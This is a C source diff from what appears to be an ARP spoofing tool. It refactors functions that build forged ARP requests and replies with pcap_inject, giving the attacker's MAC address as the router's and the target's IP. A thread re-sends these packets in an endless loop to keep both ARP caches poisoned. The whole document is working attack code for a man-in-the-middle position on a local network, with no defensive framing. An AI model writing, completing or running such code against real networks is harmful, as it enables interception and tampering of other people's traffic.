@@ -1,14 +1,5 @@
 #include "mainArpSpoofing.h"
 
-typedef struct ArpRelayStruct {
-	u_char getMyIp[IP_ADDR_LEN];
-	u_char getMyMac[ETHER_ADDR_LEN];
-	u_char getRouteIp[IP_ADDR_LEN];
-	u_char getRouteMac[ETHER_ADDR_LEN];
-	u_char getTargetIp[IP_ADDR_LEN];
-	u_char getTargetMac[ETHER_ADDR_LEN];
-} RELAY;
-
 pcap_t *fp;
 
 int ArpTargetRequest(u_char *MyMac, u_char *RouteIp, u_char *RouteMac, u_char *TargetIp, u_char *TargetMac) {
@@ -49,10 +40,10 @@ int ArpTargetRequest(u_char *MyMac, u_char *RouteIp, u_char *RouteMac, u_char *T
 	*(t_req_packet + 1) = ARPOP_REQUEST;
 	t_req_packet += sizeof(ah->ar_op);
 	for(i = 0; i < ETHER_ADDR_LEN; i++) *(t_req_packet + i) = *(MyMac + i);
-	for(j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_spa); i++, j++) *(t_req_packet + i) = *(RouteIp + j);
+	for(j = 0; i < ETHER_ADDR_LEN + IP_ADDR_LEN; i++, j++) *(t_req_packet + i) = *(RouteIp + j);
 	t_req_packet += sizeof(ah->ar_sha) + sizeof(ah->ar_spa);
 	for(i = 0; i < ETHER_ADDR_LEN; i++) *(t_req_packet + i) = 0x00;
-	for(j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_tpa); i++, j++) *(t_req_packet + i) = *(TargetIp + j);
+	for(j = 0; i < ETHER_ADDR_LEN + IP_ADDR_LEN; i++, j++) *(t_req_packet + i) = *(TargetIp + j);
 	t_req_packet += sizeof(ah->ar_tha) + sizeof(ah->ar_tpa);
 
 	t_req_packet -= sizeof(*eh) + sizeof(*ah);
@@ -101,10 +92,10 @@ int ArpTargetReply(u_char *MyMac, u_char *RouteIp, u_char *TargetIp, u_char *Tar
 	*(t_rep_packet + 1) = ARPOP_REPLY;
 	t_rep_packet += sizeof(ah->ar_op);
 	for(i = 0; i < ETHER_ADDR_LEN; i++) *(t_rep_packet + i) = *(MyMac + i);
-	for(j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_spa); i++, j++) *(t_rep_packet + i) = *(RouteIp + j);
+	for(j = 0; i < ETHER_ADDR_LEN + IP_ADDR_LEN; i++, j++) *(t_rep_packet + i) = *(RouteIp + j);
 	t_rep_packet += sizeof(ah->ar_sha) + sizeof(ah->ar_spa);
 	for(i = 0; i < ETHER_ADDR_LEN; i++) *(t_rep_packet + i) = *(TargetMac + i);
-	for(j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_tpa); i++, j++) *(t_rep_packet + i) = *(TargetIp + j);
+	for(j = 0; i < ETHER_ADDR_LEN + IP_ADDR_LEN; i++, j++) *(t_rep_packet + i) = *(TargetIp + j);
 	t_rep_packet += sizeof(ah->ar_tha) + sizeof(ah->ar_tpa);
 	t_rep_packet -= sizeof(*eh) + sizeof(*ah);
 	if((result = pcap_inject(fp, t_rep_packet, ARP_HDR_LEN)) < 0) printf("Target Reply pcap_inject() Error %d\n", result);
@@ -152,10 +143,10 @@ int ArpRouteRequest(u_char *MyMac, u_char *RouteIp, u_char *RouteMac, u_char *Ta
 	*(r_req_packet + 1) = ARPOP_REQUEST;
 	r_req_packet += sizeof(ah->ar_op);
 	for(i = 0; i < ETHER_ADDR_LEN; i++) *(r_req_packet + i) = *(MyMac + i);
-	for(j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_spa); i++, j++) *(r_req_packet + i) = *(TargetIp + j);
+	for(j = 0; i < ETHER_ADDR_LEN + IP_ADDR_LEN; i++, j++) *(r_req_packet + i) = *(TargetIp + j);
 	r_req_packet += sizeof(ah->ar_sha) + sizeof(ah->ar_spa);
 	for(i = 0; i < ETHER_ADDR_LEN; i++) *(r_req_packet + i) = 0x00;
-	for(j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_tpa); i++, j++) *(r_req_packet + i) = *(RouteIp + j);
+	for(j = 0; i < ETHER_ADDR_LEN + IP_ADDR_LEN; i++, j++) *(r_req_packet + i) = *(RouteIp + j);
 	r_req_packet += sizeof(ah->ar_tha) + sizeof(ah->ar_tpa);
 	r_req_packet -= sizeof(*eh) + sizeof(*ah);
 	if((result = pcap_inject(fp, r_req_packet, ARP_HDR_LEN)) < 0) printf("Route Request pcap_inject() Error %d\n", result);
@@ -203,10 +194,10 @@ int ArpRouteReply(u_char *MyMac, u_char *RouteIp, u_char *RouteMac, u_char *Targ
 	*(r_rep_packet + 1) = ARPOP_REPLY;
 	r_rep_packet += sizeof(ah->ar_op);
 	for(i = 0; i < ETHER_ADDR_LEN; i++) *(r_rep_packet + i) = *(MyMac + i);
-	for(j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_spa); i++, j++) *(r_rep_packet + i) = *(TargetIp + j);
+	for(j = 0; i < ETHER_ADDR_LEN + IP_ADDR_LEN; i++, j++) *(r_rep_packet + i) = *(TargetIp + j);
 	r_rep_packet += sizeof(ah->ar_sha) + sizeof(ah->ar_spa);
 	for(i = 0; i < ETHER_ADDR_LEN; i++) *(r_rep_packet + i) = *(RouteMac + i);
-	for(j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_tpa); i++, j++) *(r_rep_packet + i) = *(RouteIp + j);
+	for(j = 0; i < ETHER_ADDR_LEN + IP_ADDR_LEN; i++, j++) *(r_rep_packet + i) = *(RouteIp + j);
 	r_rep_packet += sizeof(ah->ar_tha) + sizeof(ah->ar_tpa);
 	r_rep_packet -= sizeof(*eh) + sizeof(*ah);
 	if((result = pcap_inject(fp, r_rep_packet, ARP_HDR_LEN)) < 0) printf("Route Request pcap_inject() Error %d\n", result);
@@ -217,39 +208,19 @@ int ArpRouteReply(u_char *MyMac, u_char *RouteIp, u_char *RouteMac, u_char *Targ
 }
 
 void *GetArpRelay_ThreadRun(void *arguments) {
-	RELAY *arg = (RELAY *)arguments;
+	_SPOOF *arg = (_SPOOF *)arguments;
 
 	while(1) {
 		ArpTargetRequest(arg->getMyMac, arg->getRouteIp, arg->getRouteMac, arg->getTargetIp, arg->getTargetMac);
-		sleep(1);
 		ArpTargetReply(arg->getMyMac, arg->getRouteIp, arg->getTargetIp, arg->getTargetMac);
-		sleep(1);
 		ArpRouteRequest(arg->getMyMac, arg->getRouteIp, arg->getRouteMac, arg->getTargetIp);
-		sleep(1);
 		ArpRouteReply(arg->getMyMac, arg->getRouteIp, arg->getRouteMac,arg->getTargetIp);
-		sleep(1);
+		sleep(2);
 	}
 
 	pthread_exit(NULL);
 }
 
-int GetArpRelay_Thread(u_char *setMyIp, u_char *setMyMac, u_char *setRouteIp, u_char *setRouteMac, u_char *setTargetIp, u_char *setTargetMac, pcap_t *return_fp) {
-	pthread_t pThread;
-	RELAY *args = (RELAY *)malloc(sizeof(RELAY));
-	int threadErr, i;
+void SetArpRelayPcapHandle(pcap_t *return_fp) {
 	fp = return_fp;
-
-	for(i = 0; i < IP_ADDR_LEN; i++) args->getMyIp[i] = *(setMyIp + i);
-	for(i = 0; i < IP_ADDR_LEN; i++) args->getRouteIp[i] = *(setRouteIp + i);
-	for(i = 0; i < IP_ADDR_LEN; i++) args->getTargetIp[i] = *(setTargetIp + i);
-	for(i = 0; i < ETHER_ADDR_LEN; i++) args->getMyMac[i] = *(setMyMac + i);
-	for(i = 0; i < ETHER_ADDR_LEN; i++) args->getRouteMac[i] = *(setRouteMac + i);
-	for(i = 0; i < ETHER_ADDR_LEN; i++) args->getTargetMac[i] = *(setTargetMac + i);
-	
-	if(threadErr = pthread_create(&pThread, NULL, GetArpRelay_ThreadRun, (void *)args)) {
-		printf("Thread Err = %d\n", threadErr);
-		return -1;
-	}
-
-	return 0;
 }
